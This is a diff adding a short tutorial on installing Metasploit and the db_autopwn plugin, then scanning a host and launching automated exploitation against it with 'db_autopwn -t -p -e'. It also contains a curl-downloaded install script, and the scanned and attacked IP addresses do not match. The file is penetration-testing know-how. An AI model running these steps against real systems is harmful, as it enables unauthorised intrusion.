@@ -1,0 +1,40 @@
+[metasploit][msfconsole]Metasploit Framework AutoPwn
+
+P.S.: There is a backup of AutoPwn at https://github.com/d3m0n4l3x/tools/blob/master/db_autopwn.rb
+
+1) Install/Upgrade Metasploit Framework:
+# cd ~
+# curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
+
+2) Download and install db_autopwn plugin:
+# git clone https://github.com/hahwul/metasploit-autopwn
+# cd metasploit-autopwn
+# cp ./db_autopwn.rb /opt/metasploit-framework/embedded/framework/plugins/
+
+3) Start Metasploit's database, namely PostGreSQL:
+# systemctl start postgresql
+
+4) Create a user, test1, in the database:
+# su postgres
+$ cd ~
+$ createuser test1 -P
+
+5) Create a database object named msf_db, owned by the user, test1:
+$ createdb --owner=test1 msf_db
+
+6) Connect to the database in Msfconsole by the root:
+$ exit
+# /opt/metasploit-framework/bin/msfconsole
+msfconsole> db_connect test1:test1@127.0.0.1/msf_db
+
+7) Check the status of the database's connection:
+msfconsole> db_status
+
+8) Scan the target first (assume the target is 192.168.0.1):
+msfconsole> db_nmap 192.168.0.1
+
+9) Load db_autopwn:
+msfconsole> load db_autopwn
+
+10) Automatically attack the target:
+msfconsole> db_autopwn -t -p -e 192.168.1.1
